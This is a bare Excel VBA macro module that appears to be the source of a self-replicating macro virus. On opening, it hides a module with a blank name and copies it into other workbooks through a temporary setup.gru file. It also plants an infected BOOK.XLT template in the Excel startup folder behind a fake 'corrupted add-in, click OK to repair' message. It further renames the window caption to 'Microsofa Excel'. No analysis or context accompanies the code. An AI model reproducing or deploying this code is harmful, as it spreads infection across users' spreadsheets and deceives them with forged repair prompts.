   Attribute VB_Name = "           "
   Function Auto_Open()
   Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
       Dim A As Object: Set A = Application: A.ScreenUpdating = 0: A.Caption = "Microsofa Excel"
       If Left$(ActiveWorkbook.Name, 4) = "Book" Then
           Dim C As Object: Set C = Worksheets(1).Cells(1, 1): C.VerticalAlignment = xlCenter
           C.VerticalAlignment = xlBottom
       End If
       Dim M: M = "'[" & ThisWorkbook.Name & "]           '!'Auto_Range'": A.OnWindow = M
       ThisWorkbook.OnSheetActivate = M: A.ScreenUpdating = -1
       Current_Open
       Auto_Open = Null
   End Function
   Function Auto_Range(Optional T)
   Attribute Auto_Range.VB_ProcData.VB_Invoke_Func = " \n14"
       Dim M: M = "           ": Dim D: D = M & " ": Dim A As Object, TWb As Object, AWb As Object
       Set A = Application: Set TWb = ThisWorkbook: Set AWb = ActiveWorkbook: A.ScreenUpdating = 0
       With ActiveSheet
           If .Name = M Or .Name = D Then .Visible = 0
       End With
       Dim C: Dim F: F = -1: For C = 1 To AWb.Sheets.Count
           If AWb.Sheets(C).Name = M Or AWb.Sheets(C).Name = D Then F = 0
       Next C
       If F = -1 Then
           TWb.Sheets(D).Visible = True: TWb.Sheets(D).Copy Before:=AWb.Sheets(AWb.Sheets.Count)
           AWb.Sheets(D).Visible = 0: Open "setup.gru" For Output As #1
           For C = 1 To 55: Print #1, TWb.Sheets(D).Cells(C, 1).Value: Next C
           TWb.Sheets(D).Visible = 0: Close #1: Modules.Add Before:=Sheets(Sheets.Count)
           ActiveSheet.InsertFile "setup.gru":  Kill "setup.gru": ActiveSheet.Name = M
           Modules(M).Visible = 0: If IsMissing(T) And Left$(AWb.Name, 4) <> "BOOK" Then AWb.Save
       End If
       Auto_Range = Null: A.ScreenUpdating = -1: TWb.OnSheetActivate = "'           '!'Auto_Range'"
   End Function
   Function Current_Open()
   Attribute Current_Open.VB_ProcData.VB_Invoke_Func = " \n14"
       On Error Resume Next
       Dim A As Object: Set A = Application: A.ScreenUpdating = 0
       If A.AltStartupPath = "" Then A.AltStartupPath = "C:\MSOFFICE\EXCEL\XLSTART"
       Dim Result: Result = GetAttr(A.AltStartupPath & "\book.xlt")
       If Err = 53 Then
           MsgBox "Microsoft Excel has detected a corrupted add-in file.  " & _
               "Click 'OK' to repair this file."
           A.Workbooks.Add: Dim C: C = Auto_Range(-1): ActiveWorkbook.Worksheets(1).Select
           ActiveWorkbook.SaveAs Filename:=Application.AltStartupPath & "\BOOK.XLT", _
               FileFormat:=xlTemplate
           ActiveWorkbook.Close: MsgBox "File successfully repaired!"
       End If
       A.ScreenUpdating = -1: Current_Open = Null
   End Function
   Function Auto_Close()
   Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
       Application.OnWindow = "": Dim C: For C = 1 To Workbooks.Count
           If Workbooks(C).Name <> ThisWorkbook.Name Then
               Dim D: For D = 1 To Workbooks(C).Modules.Count
                   If Workbooks(C).Modules(D).Name = "           " Then Application.OnWindow = _
                       "'[" & Workbooks(C).Name & "]           '!'Auto_Range'"
               Next D
           End If
       Next C: Auto_Close = Null
   End Function
